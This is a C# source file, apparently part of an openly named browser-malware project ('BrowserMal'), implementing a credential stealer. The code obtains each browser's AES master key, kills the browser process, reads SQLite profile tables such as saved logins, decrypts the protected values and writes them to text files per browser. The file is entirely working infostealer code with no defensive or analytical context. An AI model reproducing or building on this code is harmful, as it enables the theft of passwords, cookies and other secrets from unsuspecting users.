using BrowserMal.AES;
using BrowserMal.Browser;
using BrowserMal.Filesaver;
using BrowserMal.Util;
using SqliteReader;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Manager
{
    public class GenericManager<T>
    {
        //private static Dictionary<string, List<T>> genericList;
        private readonly string tableName;
        private readonly string[] columnNames;
        public GenericManager(string tableName, string[] columnNames)
        {
            this.tableName = tableName;
            this.columnNames = columnNames;
        }

        public void Init(ref List<BrowserModel> browsers, string profileType)
        {
            foreach (BrowserModel browser in browsers)
            {
                if (!Directory.Exists(browser.Location))
                    continue;

                byte[] key = AesGcm256.GetMasterKey(browser.Location);

                if (key == null)
                    continue;

                browser.MasterKey = key;
                ProcessUtil.KillProcess(browser.ProcessName);

                List<T> result = GetLogins(browser.Location, browser.MasterKey, profileType);

                if (result.Count == 0)
                    continue;

                FileManager.Save<T>(result, $"{browser.Name}_{tableName}.txt");
            }
        }

        private List<T> GetLogins(string path, byte[] masterKey, string profileType)
        {
            List<string> profiles = Browser.Util.GetAllProfiles(path, profileType);
            List<T> creds = new List<T>();

            foreach (string profile in profiles)
            {
                if (!File.Exists(profile))
                    continue;

                creds.AddRange(GetProfileLogins(profile, masterKey));
            }

            return creds;
        }

        private IList CreateInstance(Type t)
        {
            var listType = typeof(List<>);
            var constructedListType = listType.MakeGenericType(t);
            var instance = Activator.CreateInstance(constructedListType);
            return (IList)instance;
        }

        private T CreateInstanceOfType(Type t, object[] args)
        {
            var type = typeof(T);
            var instance = Activator.CreateInstance(type, args);
            return (T)instance;
        }

        private List<T> GetProfileLogins(string path, byte[] masterKey)
        {
            List<T> generic = new List<T>();

            SqLiteHandler sqLiteHandler = new SqLiteHandler(path);
            sqLiteHandler.ReadTable(tableName);

            for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
            {
                try
                {
                    string[] values = GrabSqliteValues(columnNames, ref sqLiteHandler, i, masterKey);

                    T obj = CreateInstanceOfType(typeof(T), values);
                    generic.Add(obj);
                 
                }
                catch { }
            }

            return generic;
        }

        private string[] GrabSqliteValues(string[] columns, ref SqLiteHandler sqLiteHandler, int row, byte[] masterKey)
        {
            string[] values = new string[columns.Length];

            for (int i = 0; i < columns.Length; i++)
            {
                // last value
                if (i == columnNames.Length - 1)
                {
                    values[i] = AesGcm256.GetEncryptedValue(sqLiteHandler.GetValue(row, columns[i]), masterKey);
                    break;
                }

                values[i] = sqLiteHandler.GetValue(row, columns[i]);
            }

            return values;
        }
    }
}
